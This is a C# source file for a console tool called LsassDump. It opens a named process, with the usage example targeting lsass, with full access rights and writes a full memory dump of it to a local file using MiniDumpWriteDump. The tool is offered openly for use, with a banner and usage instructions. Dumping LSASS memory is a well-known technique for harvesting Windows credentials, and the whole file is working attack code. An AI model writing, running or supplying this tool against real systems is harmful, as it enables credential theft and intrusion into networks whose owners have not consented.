using System;
using System.Diagnostics;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace LsassDump
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr CreateFile(string filename, Int32 access, Int32 share, IntPtr securityAttributes, Int32 creationDisposition, Int32 flagsAndAttributes, IntPtr templateFile);

        [DllImport("Dbghelp.dll")]
        static extern bool MiniDumpWriteDump(IntPtr hProcess, Int32 ProcessId, IntPtr hFile, int DumpType, IntPtr ExceptionParam, IntPtr UserStreamParam, IntPtr CallbackParam);
        static void Main(string[] args)
        {

            Console.WriteLine(@"  _                        _____                        
 | |                      |  __ \                       
 | |     ___  __ _ ___ ___| |  | |_   _ _ __ ___  _ __  
 | |    / __|/ _` / __/ __| |  | | | | | '_ ` _ \| '_ \ 
 | |____\__ \ (_| \__ \__ \ |__| | |_| | | | | | | |_) |
 |______|___/\__,_|___/___/_____/ \__,_|_| |_| |_| .__/ 
                                                 | |    
                                                 |_|    ");

            if (args == null || args.Length == 0)
            {
                Console.WriteLine("\nUSAGE: .\\LsassDump.exe <ProcessName>\n");
                Console.WriteLine("EXAMPLE: .\\LsassDump.exe lsass\n");
            }
            else
            {
                Process targetProc = Process.GetProcessesByName(args[0])[0];
                
                IntPtr hProcess = OpenProcess(0x001F0FFF, false, targetProc.Id);

                Console.WriteLine("The process ID is : " + targetProc.Id+"\n\n");

                Console.WriteLine("Dumping process with ID " + targetProc.Id + " . . .\n\n");

                IntPtr hFile = CreateFile("dumped.txt", 1073741824, 2, IntPtr.Zero, 2, 128, IntPtr.Zero);

                MiniDumpWriteDump(hProcess, targetProc.Id, hFile, 2, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);

                Console.WriteLine("DONE! Check the 'dumped.txt' file!");

            }
        }
    }
}